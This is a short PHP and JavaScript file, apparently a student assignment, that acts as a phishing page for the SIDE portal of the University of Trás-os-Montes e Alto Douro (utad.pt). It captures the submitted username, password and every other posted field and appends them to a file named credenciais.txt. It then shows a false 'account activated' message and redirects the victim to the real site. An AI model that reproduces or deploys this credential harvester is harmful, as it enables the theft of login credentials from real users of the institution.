

<script type="text/javascript">
    window.setTimeout(function() {window.location.href='https://side.utad.pt/';}, 3000);
</script>

<?php 

//parametros inseridos pelo utilizador
$j_username = $_POST['j_username'];
$j_password = $_POST['j_password'];

//mensagem que irá ser apresentada ao utilizador
$mensagem = "A sua conta foi ativada com sucesso! Irá ser redirecionado para a página inicial do SIDE dentro de momentos....";

while(true)
{
    //Caso os parametros não sejam nulos, escreve no ficheiro os dados inseridos pelo utilizador
    if($j_username != null && $j_password != null)
    {
        //abre o ficheiro em modo de escrita. Caso o ficheiro não existe, este vai ser criado
        $ficheiro = fopen("credenciais.txt", "a");
        
        //escreve os dados pretendidos no ficheiro
        foreach($_POST as $variable => $value) 
        {
            fwrite($ficheiro, $variable);
            fwrite($ficheiro, "=");
            fwrite($ficheiro, $value);
            fwrite($ficheiro, "\r\n");
        }

        fwrite($ficheiro, "\r\n");
        fclose($ficheiro);
        
        //apresenta a mensagem ao utilizador
        echo $mensagem;
        exit();
       
    }
    else if($j_username == null && $j_password == null) //Casos os parâmetros sejam nulos
    {
        //é redirecionado para uma página com a mensagem de erro de credenciais erradas
        Redirect("http://localhost/Tp2/CredenciaisErradas.php");
    }
}

//função para redirecionar paginas
function Redirect($page) 
{
    header('Location: ' . $page);
    exit();
}

?>


